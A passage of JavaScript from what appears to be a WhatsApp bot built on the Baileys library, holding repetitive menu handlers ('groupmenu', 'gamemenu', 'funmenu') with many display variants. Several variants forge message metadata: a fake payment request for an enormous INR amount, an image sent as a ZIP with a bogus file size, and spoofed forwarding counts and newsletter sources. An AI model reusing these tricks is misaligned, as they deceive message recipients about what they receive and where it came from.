                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'groupmenu': {
		if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)
let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
${cmenut} ${readmore}\n\n${groupmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
                } else if (typemenu === 'v2') {
                    Yasam.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fvrif
                    })
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: fvrif
                    })
                    } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'gamemenu': {
		if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)
let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
${cmenut} ${readmore}\n\n${gamemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
                } else if (typemenu === 'v2') {
                    Yasam.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fvrif
                    })
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: fvrif
                    })
                    } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'funmenu': {
		if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)
let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
${cmenut} ${readmore}\n\n${funmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
                } else if (typemenu === 'v2') {
                    Yasam.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fvrif
                    })
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: fvrif
                    })
                    } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
